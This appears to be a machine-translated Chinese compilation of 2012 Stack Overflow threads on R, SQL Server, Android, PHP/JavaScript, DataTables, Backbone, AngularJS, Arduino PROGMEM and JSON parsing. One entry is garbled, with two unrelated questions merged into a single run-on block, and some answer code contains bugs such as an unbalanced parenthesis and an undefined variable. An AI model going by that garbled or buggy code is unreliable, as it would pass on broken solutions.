# r - 如何检查一个数字序列是否单调递增（或递减）？

> ID：13093912
> 
> 赞同：43
> 
> 时间：2012-10-26T20:23:17.203
> 
> 标签：r, vector

我们得到一个数字序列，作为一个向量`foo`。任务是找到*单调递增*- 每个项目小于或等于下一个 - 或`foo`单调*递减*- 每个项目大于或等于下一个。

 **当然这可以通过循环找到，但是还有更多的创意吗？

* * *

## 回答 #1

> 赞同：61
> 
> 时间：2012-10-26T21:39:12.503

另一个：检查是否

```
all(x == cummax(x)) 
```

或者

```
all(x == cummin(x)) 
```

分别为单调递增或递减。这似乎`cummax`比`diff`而且使用更少的内存要快得多：

```
> x <- seq_len(1e7)
> system.time(all(x == cummax(x)))
   user  system elapsed 
   0.11    0.00    0.11 
> system.time(all(diff(x) >= 0))
   user  system elapsed 
   0.47    0.13    0.59

> x <- seq_len(1e8)
> system.time(all(x == cummax(x)))
   user  system elapsed 
   1.06    0.09    1.16 
> system.time(all(diff(x) >= 0))
Error: cannot allocate vector of size 381.5 Mb
In addition: Warning messages:
1: Reached total allocation of 1535Mb: see help(memory.size) 
2: Reached total allocation of 1535Mb: see help(memory.size) 
3: Reached total allocation of 1535Mb: see help(memory.size) 
4: Reached total allocation of 1535Mb: see help(memory.size) 
Timing stopped at: 1.96 0.38 2.33 
```

我打赌为什么`cummax`比 is 更快，`diff`因为它只需要比较比计算差异更快的数字。

**编辑**：应您（阿里）的要求，包括您的答案在内的其他测试（请注意，我现在正在另一台机器上运行，因此不应将以下结果与上述结果进行比较）

```
> x <- seq_len(1e7)
> system.time(x == cummax(x))
   user  system elapsed 
  0.316   0.096   0.416 
> system.time(all(diff(x) >= 0))
   user  system elapsed 
  4.364   0.240   4.632 
> system.time(x[-1] - x[-length(x)] >= 0)
   user  system elapsed 
  3.828   0.380   4.227
> system.time(all(x[-1] >= x[-length(x)]))
   user  system elapsed 
  2.572   0.288   2.865 
```

* * *

## 回答 #2

> 赞同：14
> 
> 时间：2012-10-26T20:31:15.670

一种选择是使用该`diff()`函数来给出向量中相邻元素之间的差异。

单调递增函数将`diff(x)`全部 > 或等于 0：

```
f1 <- 1:10
f2 <- 10:1

> all(diff(f1) >= 0)
[1] TRUE
> all(diff(f2) >= 0)
[1] FALSE 
```

`0`尽管可能不赞成测试平等；更好的可能是通过以下方式使用`< 0`和否定比较`!`：

```
> all(!diff(f1) < 0)
[1] TRUE
> all(!diff(f2) < 0)
[1] FALSE 
```

原因是您使用的计算机无法准确表示所有数字。您可能会计算出实际上为零但不完全为零的结果，因为计算中的数字无法准确表示（即[浮点数](https://cran.r-project.org/doc/FAQ/R-FAQ.html#Why-doesn_0027t-R-think-these-numbers-are-equal_003f)）。因此，如果`foo`是计算的结果，则测试它是否等于 0 可能会导致应该是 0 稍微大于或小于 0 的结果，这可能会为增加/减少函数给出错误的结果。

* * *

## 回答 #3

> 赞同：10
> 
> 时间：2016-05-05T20:39:58.653

对于增加的版本，您可以使用`is.unsorted()`：

```
x <- seq_len(1e7)
!is.unsorted(x)

> !is.unsorted(x)
[1] TRUE 
```

这也很快：

```
> system.time(!is.unsorted(x))
   user  system elapsed 
  0.099   0.000   0.099 
> system.time(all(x == cummax(x)))
   user  system elapsed 
  0.320   0.039   0.360 
```

不幸`is.unsorted()`的是明确用于增加顺序。我们在将其转换为下降的情况时受到了一些打击，但它仍然与我系统上的其他选项具有竞争力：

```
xx <- 1e7:1
!is.unsorted(-xx)
system.time(!is.unsorted(-xx))

> system.time(!is.unsorted(-xx))
   user  system elapsed 
  0.205   0.020   0.226 
> system.time(all(xx == cummin(xx)))
   user  system elapsed 
  0.356   0.088   0.444 
```

在一个更大的问题上......

```
x  <- 1:1e8
xx <- 1e8:1
system.time(!is.unsorted(x))
system.time(all(x == cummax(x)))
system.time(!is.unsorted(-xx))
system.time(all(xx == cummin(xx)))

> system.time(!is.unsorted(x))
   user  system elapsed 
  1.019   0.000   1.019 
> system.time(all(x == cummax(x)))
   user  system elapsed 
  3.255   0.354   3.608 
> system.time(!is.unsorted(-xx))
   user  system elapsed 
  2.089   0.561   2.650 
> system.time(all(xx == cummin(xx)))
   user  system elapsed 
  3.318   0.395   3.713 
```

如果您想强制执行严格递增的序列，请`strictly`参见`?is.unsorted`.

* * *

## 回答 #4

> 赞同：7
> 
> 时间：2012-10-26T20:27:06.003

`all(diff(x)<0)`（酌情替换`>`, `<=`）`>=`

* * *

## 回答 #5

> 赞同：0
> 
> 时间：2012-10-26T20:27:15.590

一个有趣的答案如下：

```
foo = c(1, 3, 7, 10, 15)
all(foo[-1] - foo[-length(foo)] >= 0) # TRUE

foo[3] = 20
all(foo[-1] - foo[-length(foo)] >= 0) # FALSE 
```**

# sql-server - SQL Server 中 8% 字符序列的意义

> ID：13093913
> 
> 赞同：1
> 
> 时间：2012-10-26T20:23:21.380
> 
> 标签：sql-server

SQL Server中8%的字符序列有什么特别之处吗？

我一生都无法弄清楚以下查询如何返回 %H539 而不是 %H5398%

```
DECLARE @contractnumber AS VARCHAR(5) = 'H5398'
if(@contractNumber is not null) set @contractNumber = '%' + @contractNumber + '%'
PRINT @contractnumber 
```

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-10-26T20:26:02.977

你有一个 varchar(5)。`'%H539'`是 5 个字符...字段已满，因此`'8%'`被截断。尝试使用 varchar(7) 代替。

# android - Android registerOnSharedPreferenceChangeListener（）不起作用

> ID：13093915
> 
> 赞同：0
> 
> 时间：2012-10-26T20:23:27.890
> 
> 标签：android, sharedpreferences

我有一个非常奇怪的。我有 2 个应用程序，一个免费应用程序和一个付费应用程序，它们都使用基本相同的代码，除了一些在免费应用程序中显示广告的代码。

出于某种原因， registerOnSharedPreferenceChangeListener() 不在免费版本中运行。更奇怪的是……如果我在该行代码处放置一个断点，然后运行调试器，它就会正常注册。如果没有断点，它永远不会注册。知道什么会导致这种情况吗？也许项目设置有所不同？我整天都在努力解决这个问题！

代码：

```
SharedPreferences.OnSharedPreferenceChangeListener prefsListener = new SharedPreferences.OnSharedPreferenceChangeListener() {
        @Override
        public void onSharedPreferenceChanged(SharedPreferences prefs, String key) {
            if(key.equals(AUTORESPONSEGLOBAL))
            {
                ARCheckBox.setChecked(settings.getBoolean(AUTORESPONSEGLOBAL, false));
                if(ARCheckBox.isChecked())
                {
                    //green 0xaarrggbb a=alpha
                    AR_label.setTextColor(0xff00ff00);
                }
                else
                {
                    //red
                    AR_label.setTextColor(0xffff0000);
                }
            }
            if(key.equals(CLOCK24))
            {
                updateTime();
            }
        }
    };

    settings.registerOnSharedPreferenceChangeListener(prefsListener); 
```

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-10-30T13:07:15.960

好的，我仍然不确定为什么它在一个项目而不是另一个项目中工作......但我修复了它。

我`SharedPreferences.OnSharedPreferenceChangeListener prefsListener = new SharedPreferences.OnSharedPreferenceChangeListener() { ... };`在`onCreate()`. 我将其更改为它自己的单独方法，现在它似乎工作正常。我改变了两个项目以这种方式工作，以保持一致。

# php - 如何在“onChange”事件的回显中调用“php”输入框中的 JavaScript 函数

> ID：13093919
> 
> 赞同：0
> 
> 时间：2012-10-26T20:23:55.953
> 
> 标签：php, javascript, html

OnChange事件中使用的javascript函数

```
function calc(A,B,SUM) { 
    var one = Number(A); 
    if (isNaN(one)) { alert('Invalid entry: '+A); one=0; } 
    var two = Number(document.getElementById(B).value);  
    if (isNaN(two)) { alert('Invalid entry: '+B); two=0; } 
    document.getElementById(SUM).value = parseInt(one) + parseInt(two);
} 
```

我有 forloop 用于创建 10 输入 fox

## 输入框

```
<?php
for($k=1;$k<=$textboxindex;$k++)
{
    echo "<input type=\"text\" class='textboxsizeqty' name=\"qty[]\" value=\"$qty\" id         ='op1' onChange=\"calc('this.value','op2','result');\"/>";
    echo "<br/>";
}
?> 
```

## 输入框

```
<?php
for($k=1;$k<=$textboxindex;$k++)
{
    echo "<input type=\"text\" class='textboxsize' name=\"rate[]\" value=\"$rate\" id      ='op2' onChange=\"calc('this.value','op2','result');\" />";
    echo "<br/>";
}
?>

<?php
for($k=1;$k<=$textboxindex;$k++)
{
    echo "<input type=\"text\" class='textboxsize' name=\"sum[]\" value=\"\"     id='result'/>";
    echo "<br/>";
}
?> 
```

我正在做的事情在这里行不通。我是 PHP 新手。谢谢

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-10-26T20:33:10.700

请尝试以及为什么在 this.value 中给出引号。

```
<?php
for($k=1;$k<=$textboxindex;$k++)
{
echo "<input type=\"text\" class='textboxsizeqty' name=\"qty[]\" value=\"$qty\" id         ='op1' onChange=\"calc(this.value,'op2','result');\"/>";
echo "<br/>";
}
?> 
```

# asp.net-mvc-3 - 使用选择菜单（DataTables）进行列过滤

> ID：13093920
> 
> 赞同：0
> 
> 时间：2012-10-26T20:23:59.680
> 
> 标签：asp.net-mvc-3, datatables, filtering

再会！

我正在使用 MVC3 和 jquery DataTables 插件。关键是使用选择菜单（进一步多选）进行列过滤。

[这是我的 JS，它与这个DataTables 示例](http://datatables.net/release-datatables/examples/api/multi_filter_select.html)非常相似：

```
 (function ($) {
    $.fn.dataTableExt.oApi.fnGetColumnData = function (oSettings, iColumn, bUnique, bFiltered, bIgnoreEmpty) {
        // check that we have a column id
        if (typeof iColumn == "undefined") return new Array();

        // by default we only want unique data
        if (typeof bUnique == "undefined") bUnique = true;

        // by default we do want to only look at filtered data
        if (typeof bFiltered == "undefined") bFiltered = true;

        // by default we do not want to include empty values
        if (typeof bIgnoreEmpty == "undefined") bIgnoreEmpty = true;

        // list of rows which we're going to loop through
        var aiRows;

        // use only filtered rows
        if (bFiltered == true) aiRows = oSettings.aiDisplay;
        // use all rows
        else aiRows = oSettings.aiDisplayMaster; // all row numbers

        // set up data array   
        var asResultData = new Array();

        for (var i = 0, c = aiRows.length; i < c; i++) {
            iRow = aiRows[i];
            var aData = this.fnGetData(iRow);
            var sValue = aData[iColumn];

            // ignore empty values?
            if (bIgnoreEmpty == true && sValue.length == 0) continue;

            // ignore unique values?
            else if (bUnique == true && jQuery.inArray(sValue, asResultData) > -1) continue;

            // else push the value onto the result data array
            else asResultData.push(sValue);
        }

        return asResultData;
    } 
} (jQuery));

function fnCreateSelect(aData) {
    var r = '<select><option value=""></option>', i, iLen = aData.length;
    for (i = 0; i < iLen; i++) {
        r += '<option value="' + aData[i] + '">' + aData[i] + '</option>';
    }
    return r + '</select>';
}
$(document).ready(function () {
    var oTable = $('#dataTable').dataTable({
        "sDom": 'W<"clear">lfrtip',
        "sAjaxSource": '@Url.Action("ResourcesWorkflowData", "LineManager")',
        "aoColumns": [
  { "sTitle": "User", "mData": "User" },
  { "sTitle": "Region", "mData": "Region" },
    ]
 });
    /* Add a select menu for each TH element in the table footer */
    $("tfoot th").each(function (i) {
        this.innerHTML = fnCreateSelect(oTable.fnGetColumnData(i));
        $('select', this).change(function () {
            oTable.fnFilter($(this).val(), i);
        });
    });
}); 
```

问题出在我的 aaData 中。如果我传递这样的数组数组：

```
 "aaData": [
  ['User1', 'Central'],
  ['User2', 'Central'],
] 
```

一切都很好，但是如果我制作这样的对象数组：

```
 "aaData": [
  {
      "User": "User1",
      "Region": "Central",
  },
  {
      "User": "User2",
      "Region": "Central",
  }
] 
```

我在这行 js 中收到“无法读取未定义的属性‘长度’”错误：

```
 // ignore empty values?
            if (bIgnoreEmpty == true && sValue.length == 0) continue; 
```

为什么会这样？我试图使用一些附加组件，如[ColumnFilter](http://jquery-datatables-column-filter.googlecode.com/svn/trunk/index.html)或[ColumnFilterWidgets](http://datatables.net/extras/thirdparty/ColumnFilterWidgets/DataTables/extras/ColumnFilterWidgets/)但在这两种情况下我都遇到了一些问题。请问有什么建议吗？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-05-17T16:49:45.367

看起来 sValue 为空，这意味着您在 Json 中的一个字段为空。你能粘贴你的完整Json吗？

这类问题有一些小技巧。

只是为了确保非字段为空，您可以编写如下简单的内容：

```
 User = SomeObject.User != null ? SomeObject.User : " "; 
```

这应该可以解决您的问题，因为值将不再为空。

# backbone.js - 在 Backbonejs 的嵌套集合中获取模型

> ID：13093921
> 
> 赞同：1
> 
> 时间：2012-10-26T20:24:13.550
> 
> 标签：backbone.js, backbone.js-collections

我正在一个集合中工作，该集合包含一个带有“自身”集合的模型。例如：

```
[{
     id: 1
     name: "John",
     children: [
         {
              id: 32
              name: "Peter",
              children: []
         },
         {
              id: 54
              name: "Mary",
              children: [
                  {
                      id:12,
                      name: "Kevin"
                  }
         ]
         },
     ]
}] 
```

假设我想通过其 ID 获取 Kevin“用户”。但我所拥有的只是“第一个收藏”。我怎样才能做到这一点？？关于在集合中设置用户？另一件事：有可能从他那里得到所有凯文的“父母”吗？像玛丽和约翰？

有没有人遇到过这样的问题？

多谢

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-10-27T00:37:56.453

下划线（这是一个 Backbone 依赖项，所以你已经拥有它）非常适合这种事情；如果你使用它的“map”函数（Backbone 作为 Collection 上的一个方法提供）和它的 find 函数，你可以执行以下操作：

```
findPersonInPeopleCollection: function(nameWeAreLookingFor) {
    function findChildren(person) {
        if (!person.children) return [person];
        var children = _.map(person.children, function(child) {
            foundPeople.push(findChildren(child);
        })
        return _.flatten(children);
    }
    var allPeople = _.flatten(myCollectionOfPeople.map(findChildren));
    return _(allPeople).find(function(person) {
        return person.get('name') == nameWeAreLookingFor;
    }
} 
```

如果您最初想存储父母，您可以向“Person”模型类的初始化函数添加逻辑，例如。

```
var Person = Backbone.Model.extend({
    initialize: function() {
        _.each(this.get('children'), function(child) {
            child.parent = this;
        }, this);
    }
 }); 
```

您也可以通过覆盖集合的 add 方法或向其中添加一个在添加人员后触发的事件处理程序来执行类似的操作。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-10-30T11:32:59.093

好吧，我在 User's Collection 上创建了一个递归函数，似乎暂时解决了这个问题（最好的一点是我可以使用它来检索“深层”模型并对其进行更改。）。类似的东西（如果有人有任何建议，请自由发表意见）：

```
findUserById: function(id) {
        var self = new Backbone.Collection(this.toJSON());

        return thisCollection(id, this);

        function thisCollection(id, collection, array) {
            var innerSelf = collection || this;
            var thisArray = array || [];
            for(var i = innerSelf.models.length; i--;) {
                if(innerSelf.models[i].get('id') == id) {
                    return [innerSelf.models[i]].concat([thisArray]);
                }else {
                    if(innerSelf.models[i].get('children').length > 0) {
                        thisArray.push(innerSelf.models[i]);
                        return thisCollection(id, innerSelf.models[i].get('children'), thisArray);
                    }else {
                        innerSelf.remove(innerSelf.models[i]);
                        return thisCollection(id, self, []);
                    }   

                }
            }
        }

    } 
```

基本上我返回一个包含 2 个项目的数组。第一个是我要查找的记录，第二个是包含该用户父母的数组。

# php - 操作方法：PHP + Javascript 弹出窗口

> ID：13093922
> 
> 赞同：2
> 
> 时间：2012-10-26T20:24:13.840
> 
> 标签：php, javascript, popup

我有以下代码，它为我提供了前端项目的列表，但我希望这些链接在新的弹出窗口中打开。有没有办法我可以做到这一点？谢谢你。

```
echo '<div class="item_row_header">';

    for($i=0;$i<count($this->fields);$i++)  {
        echo '<div class="item_cell jdheader'.$this->fields[$i]->cssclass.'">';

        //to display the header with/without sorting option

        if(in_array($this->fields[$i]->type, array(10,11,12,13)))

            echo $this->fields[$i]->name;

        else

            echo JHTML::_('jdgrid.sort', $this->fields[$i]->name, 'field_'.$this->fields[$i]->id, @$this->cparams->filter_order_Dir, @$this->cparams->filter_order );

        echo '</div>';

    }

    echo '<div class="clr"></div></div>';

    }

echo '<div class="itemlist itemlist_type'.$this->type->id.'">';

if(count($this->items)) {

    //all the item list part display here

    for($i=0;$i<count($this->items);$i++)   {

        $item =  $this->items[$i];

        require(dirname(__FILE__).DS.'default_item.php');

    } 
```

这是我使用上面的代码在前端得到的：

```
 <div class="item_row_header">
  <div class="item_cell jdheader"><a href="javascript:void(0);" id="sort" class='field_70 desc' title="Clique para ordenar por coluna">Título</a></div>
  <div class="item_cell jdheader">Fotos</div>
  <div class="item_cell jdheader"><a href="javascript:void(0);" id="sort" class='field_63 desc' title="Clique para ordenar por coluna">Cidade</a></div>
  <div class="item_cell jdheader"><a href="javascript:void(0);" id="sort" class='field_64 desc' title="Clique para ordenar por coluna">Estado</a></div>
  <div class="item_cell jdheader"><a href="javascript:void(0);" id="sort" class='field_60 desc' title="Clique para ordenar por coluna">Tipo do Imóvel</a></div>
  <div class="item_cell jdheader"><a href="javascript:void(0);" id="sort" class='field_67 desc' title="Clique para ordenar por coluna">Valor R$</a></div>
  <div class="clr"></div>
</div>
<div class="itemlist itemlist_type15">
  <div class="item_row_bg featured itemrow_type15">
    <div class="item_content">
      <div class="item_cell "><a href="/joomla/temporada/imoveis/itens/ver/temporada-destaque">Temporada Destaque</a></div>
      <div class="item_cell "><img src="http://mysite.com.br/joomla/images/joomd/thumbs/1350654862temporada-destaque.jpg" alt="Fotos" /></div>
      <div class="item_cell ">Exemplo de Cidade</div>
      <div class="item_cell ">São Paulo</div>
      <div class="item_cell ">Casa</div>
      <div class="item_cell ">600</div>
      <div class="clr"></div>
    </div>
  </div>
  <div class="item_row itemrow_type15">
    <div class="item_content">
      <div class="item_cell "><a href="/joomla/temporada/imoveis/itens/ver/temporada">Temporada</a></div>
      <div class="item_cell "><img src="http://mysite.com.br/joomla/images/joomd/thumbs/1350654792temporada.jpg" alt="Fotos" /></div>
      <div class="item_cell ">Exemplo de Cidade</div>
      <div class="item_cell ">São Paulo</div>
      <div class="item_cell ">Casa</div>
      <div class="item_cell ">800</div>
      <div class="clr"></div>
    </div>
  </div>
</div> 
```

* * *

这是我解决它的方法：

我打开了 default_item.php 并发现了这个：

```
if($j==0)   {

echo '<a href="'.JRoute::_('index.php?option=com_joomd&view=item&layout=detail&typeid='.$item->typeid.'&id='.$item->id).'">';

echo $this->field->displayfieldvalue($item->id, $this->fields[$j]->id, true);

echo '</a>'; 
```

}

然后我可以使用 jQuery [http://swip.codylindley.com/popupWindowDemo.html][1] 调用弹出窗口

这是我的工作代码现在的样子：

```
echo '<a class="propriedade" href="'.JRoute::_('index.php?option=com_joomd&view=item&layout=detail&typeid='.$item->typeid.'&id='.$item->id).'">'; 
```

非常感谢大家的帮助。

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-10-26T20:30:24.500

正如 Alex 所指出的，仅使用 PHP 是不可能的。PHP 是一种在页面加载之前发生的服务器端语言。您可以使用 HTML 和 JavaScript 实现此目的。

您应该查看 JavaScript 函数，该函数`open()`允许您打开一个具有精确宽度/高度和指定 URL 的新窗口。

[在此处阅读有关 open() 的更多信息](http://www.w3schools.com/jsref/met_win_open.asp)

**示例代码：**

```
myWindow=window.open('http://google.com','','width=200,height=200') 
```

这将在一个尺寸为 200x200 像素的新窗口中打开 Google

要使用此代码，您必须将其插入`<script>`标签或外部 JavaScript 文件中。我建议将其用作这样的函数：

```
function newWindow(url, width, height)
{
    myWindow=window.open(url,'','width=' + width + ',height=' + height);
} 
```

然后，您可以使用以下命令调用它：

```
newWindow('http://google.com', 200, 200) 
```

您可以使用以下`onCLick`属性在代码中实现此功能：

```
<a href="#" onclick="newWindow('http://google.com', 200, 200)">Click Me</a> 
```

[使用 HTML 和 JavaScript 演示我的函数](http://jsfiddle.net/RwPkV/)

我建议使用此功能的原因是`target="_blank"`在某些浏览器上使用该属性只会在一个新选项卡中打开，您可以使用它，但我假设您想要一个全新的窗口

现在您已经为您的问题添加了一些代码，我可以看到您有很多列表项，您可以简单地添加一个锚标记来使我的功能正常工作，例如：

```
<div class="item_cell "><img src="http://alii.com.br/joomla/images/joomd/thumbs/1350654792temporada.jpg" alt="Fotos" /></div>
<div class="item_cell ">Exemplo de Cidade</div>
<div class="item_cell ">São Paulo</div>
<div class="item_cell ">Casa</div>
<div class="item_cell ">800</div> 
```

会成为：

```
<div class="item_cell "><a href="#" onclick="newWindow(URL, WIDTH, HEIGHT)"><img src="http://alii.com.br/joomla/images/joomd/thumbs/1350654792temporada.jpg" alt="Fotos" /></a></div>
<div class="item_cell "><a href="#" onclick="newWindow(URL, WIDTH, HEIGHT)">Exemplo de Cidade</a></div>
<div class="item_cell "><a href="#" onclick="newWindow(URL, WIDTH, HEIGHT)">São Paulo</a></div>
<div class="item_cell "><a href="#" onclick="newWindow(URL, WIDTH, HEIGHT)">Casa</a></div>
<div class="item_cell "><a href="#" onclick="newWindow(URL, WIDTH, HEIGHT)">800</a></div> 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-10-26T20:29:07.797

在游览标签中添加 target="_blank" 或使用 window.open 方法。

```
e.g.: 
<a href="http://google.com" target="_blank">Google</a>
or
<script>window.open('http://google.com','','width=200,height=200'); </script> 
```

# javascript - 如何选择 HTML `` 使用 JavaScript 的元素可能重复：选择多个选项的 Javascript 如何使用 JavaScript 选择 HTML <select multiple="">元素的选项？C - 如何使用 PROGMEM 存储和读取 char 数组 我有三个 char 数组，我不希望 Arduino 将它们存储在 SRAM 中，所以我想使用 PROGMEM 在闪存中存储和读取，而不是。char *firstArr[]={"选项 1","选项 2","选项 3", ID：13093925 赞同：-3 时间：2012-10-26T20:24:28.567 标签：javascript 回答 #1 赞同：1 时间：2012-10-27T14:54:51.857 我的快速示例： <select multiple id="select"> <option value="1">1</option> <option value="2" class="toselect">2</option> <option value="3">3</option> <option value="4" class="toselect">4</option> <option value="5">5</option> </select> <script type="text/javascript"> var select = document.getElementById("select"); var select_options = select.getElementsByClassName("toselect"); for (var i = 0; typeof(select_options) != "undefined"; i++) { select_options[i].selected = true; } </script> 在这里，我使用类名来指定需要选择的选项。你可以使用任何你想要的东西。 回答 #2 赞同：0 时间：2012-10-27T14:54:46.100 像这样的东西： var selectBox = document.getElementById('selectbox'); selectBox.children[1].selected = true; ​ 完整示例：jsFiddle</select>

# angularjs - AngularJS 中的指令和范围

> ID：13093926
> 
> 赞同：2
> 
> 时间：2012-10-26T20:24:28.657
> 
> 标签：angularjs

这是代码，理想情况下我应该看到

> 父母：真

当我点击切换

但是，它不起作用

这是[plunker](http://plnkr.co/edit/F38BkA)

```
<body ng-controller="MainCtrl">
  <button type="button" ng-click='isParentShown= !isParentShown' >Toggle</button>
  <div><span>Controller-isParentShown: {{isParentShown}}</span></div>
  <parent isShown='isParentShown'></parent>

</body>

var app = angular.module('plunker', []).directive('parent',function(){
    return {
        restrict: 'E',
        replace: true,
        scope: {
                isShown: '='
        },
        template: '<span>Parent: {{isShown}}</span>'
    };
}).directive('child',function(){
    return {
        restrict: 'E',
        replace: true,
        template:'<span>Child: {{isChildShown}}</span>',
        scope: {
                isChildShown: '@'
        }
    };
});
app.controller('MainCtrl', function($scope) {
  $scope.isParentShown = false;
}); 
```

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-10-26T20:55:57.153

问题出在属性的大小写中，如果您定义了 isShown 绑定，则它需要一个`is-shown`or`is:shown`属性。这是固定的 plunker：[http ://plnkr.co/edit/UOigth](http://plnkr.co/edit/UOigth)

# c - C - 如何使用 PROGMEM 存储和读取 char 数组

> ID：13093927
> 
> 赞同：6
> 
> 时间：2012-10-26T20:24:29.057
> 
> 标签：c, arduino

我有三个 char 数组，我不希望 Arduino 将它们存储在[SRAM](http://en.wikipedia.org/wiki/Static_random-access_memory)中，所以我想使用 PROGMEM 来存储和读取[flash](http://en.wikipedia.org/wiki/Flash_memory)，而不是。

```
char *firstArr[]={"option 1","option 2","option 3","option 4"};
char *secondArr[]={"test 1","test 2"}; 
```

* * *

## 回答 #1

> 赞同：6
> 
> 时间：2012-10-26T20:27:32.960

[在 Arduino 网站上](http://www.arduino.cc/en/Reference/PROGMEM)有一个关于如何精确执行此操作的示例。（参见“字符串数组”一节。）

* * *

## 回答 #2

> 赞同：3
> 
> 时间：2012-10-26T20:39:19.257

是的，Arduino 网站上有一个示例。但我想让您了解[GCC 中的编译器错误](http://gcc.gnu.org/bugzilla/show_bug.cgi?id=34734)，以及以下解决方法：

```
/**
 * Alternative to PROGMEM storage class
 * 
 * Same effect as PROGMEM storage class, but avoiding erroneous warning by
 * GCC.
 * 
 * \see http://gcc.gnu.org/bugzilla/show_bug.cgi?id=34734
 */
#define PROGMEM_ __attribute__((section(".progmem.data"))) 
```

# mysql - ExpressionEngine textarea 增加限制

> ID：13093929
> 
> 赞同：9
> 
> 时间：2012-10-26T20:24:33.650
> 
> 标签：mysql, expressionengine

设想：

*   客户将时事通讯添加到他的网站
*   `textarea`字段以特定字符数截断粘贴的源代码。
*   考虑增加字符数限制，`textarea`以便可以粘贴整个时事通讯源代码。
*   使用 ExpressionEngine 2.5.2

关于如何增加 MySQL 字符限制的任何想法？我查看`channel_fields`并尝试将行数从 172 增加到 9999 和`field_settings row`to `longtext`，但这没有效果。

* * *

## 回答 #1

> 赞同：10
> 
> 时间：2012-10-26T20:45:15.987

刚刚对此进行了测试，解决此问题的方法是更改`exp_chanel_data`​​表本身的结构。

使用 PHPMyAdmin、Sequel Pro 或类似工具，`exp_channel_data`通过将数据类型从更改为`TEXT`与`MEDIUMTEXT`您的自定义字段对应的字段来更改结构。字段名称类似于`field_id_x`X 对应于您正在使用的自定义字段字段的 id 的位置。

# r - R从字符串中删除最后一个单词

> ID：13093931
> 
> 赞同：15
> 
> 时间：2012-10-26T20:24:36.840
> 
> 标签：r, regex, string

我正在尝试做某事，但不记得/找到答案。我有一份来自人口普查局的城市名称列表，他们把城市的类型放在最后，这弄乱了我的`match()`.

我想做这个：

```
Middletown Township
Sunny Valley Borough
Hillside Village 
```

进入这个：

```
Middletown
Sunny Valley
Hillside 
```

有什么建议么？理想情况下，我还想知道`lastIndexOf()`R 中是否有函数。

这是输出：

```
> dput(df1)
structure(list(id = c(1, 2, 3), city = structure(c(2L, 3L, 1L
), .Label = c("Hillside Village", "Middletown Township", "Sunny Valley Borough"
), class = "factor")), .Names = c("id", "city"), row.names = c(NA, 
-3L), class = "data.frame") 
```

* * *

## 回答 #1

> 赞同：22
> 
> 时间：2012-10-26T20:28:04.000

这将起作用：

```
gsub("\\s*\\w*$", "", df1$city)
[1] "Middletown"   "Sunny Valley" "Hillside" 
```

它删除由一个或多个空格字符组成的任何子字符串，后跟任意数量的“单词”字符（空格、数字或下划线），然后是字符串的结尾。

* * *

## 回答 #2

> 赞同：18
> 
> 时间：2012-10-26T20:29:44.353

这是一个满足您需要的正则表达式：

```
sub(df1$city, pattern = " [[:alpha:]]*$", replacement = "") 
```

> [1] 《中城》《阳光谷》《山坡》

那就是用一个空字符串替换一个以空格开头，然后只包含字母直到字符串结尾的子字符串。

* * *

## 回答 #3

> 赞同：2
> 
> 时间：2021-04-20T08:43:06.580

我会`word()`像这样在 stringr 包中使用：

```
df1 %>% mutate(city = word(city , 1  , -2)) 
```

第一个参数 ( `1`) 表示您从第一个单词开始，第二个 ( `-2`) 表示您将所有内容保持到倒数第二个单词。

# javascript - javascript解析json

> ID：13093932
> 
> 赞同：0
> 
> 时间：2012-10-26T20:24:38.143
> 
> 标签：javascript, ajax, json

我的 javascript 有问题，我调用了一个返回此字符串的 ajax 方法：

```
{
  "ObjectResponse": {
    "Operation": "OK",
    "Response": "SUCCESS",
    "Message": "List of AAA Found",
    "List": [
      {
        "keySource": "gat\/images\/images_set\/apple.jpg",
        "idSiteKey": "1",
        "text": "Apple"
      },
      {
        "keySource": "gat\/images\/images_set\/cat.jpg",
        "idSiteKey": "2",
        "text": "Cat"
      },
      {
        "keySource": "gat\/images\/images_set\/coffee.jpg",
        "idSiteKey": "3",
        "text": "Coffee"
      },
      {
        "keySource": "gat\/images\/images_set\/dog.jpg",
        "idSiteKey": "4",
        "text": "Dog"
      },
      {
        "keySource": "gat\/images\/images_set\/horse.jpg",
        "idSiteKey": "5",
        "text": "Horse"
      },
      {
        "keySource": "gat\/images\/images_set\/police.jpg",
        "idSiteKey": "6",
        "text": "Police"
      },
      {
        "keySource": "gat\/images\/images_set\/tree.jpg",
        "idSiteKey": "7",
        "text": "Tree"
      }
    ]
  }
} 
```

我以这种方式评估内容：

```
xhr.onreadystatechange = ensureReadiness; 
....
responseText = xhr.responseText; 
```

如果我尝试在 javascript 上解析它：

```
response = JSON.parse(responseText); 
```

如果我访问一个属性，`response.ObjectResponse.Operation`我确实得到了正确的内容..但是当我尝试访问列表时它总是刹车

如果我尝试相同的字符串，但不是调用服务，而是将内容分配给它可以工作的 var，我确实可以访问列表

```
var myTemporalString ='{"ObjectResponse":{"Operation":"OK","Response":"SUCCESS","Message":"List of Keys Found","List":...';
response.JSON.parse(myTemporalString); 
```

任何建议为什么会发生这种情况？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-10-26T20:41:14.747

你可以试试这个方法

```
 xhr.onreadystatechange = function() {
                if (xhr.readyState == 4) {
                    if (xhr.status == 200) {

                        try{
                                var mJsonData = JSON.parse(xhr.responseText);
                            }catch(err){
                                console.log(err);
                                alert(err);
                                return;
                            }

                        for(i=0;i<jsondata.ObjectResponse.List.length;i++){
                                   console.log(jsondata.ObjectResponse.List[i].text);
                                 console.log(jsondata.ObjectResponse.List[i].keySource);
                                   console.log(jsondata.ObjectResponse.List[i]. idSiteKey);
                           }

              }
           }
       } 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-10-26T20:38:14.413

使用循环！

```
var array = response.ObjectResponse.List;
var len = array.length;
for(i=0; i<len; i++) {
    //Use array[i] to access the list
    array[i].keySource
    array[i].idSiteKey
    array[i].text
} 
```

# java - 在 Java 中使用正则表达式贪婪搜索字符串模式

> ID：13093936
> 
> 赞同：1
> 
> 时间：2012-10-26T20:24:52.293
> 
> 标签：java, regex, pattern-matching

我有一个用例，我想在给定字符串中的 <、>、<=、>= 和 = 中搜索一个运算符，并将表达式分成两部分，即右表达式和左表达式，并在之前单独评估它们评估最终的条件运算符。

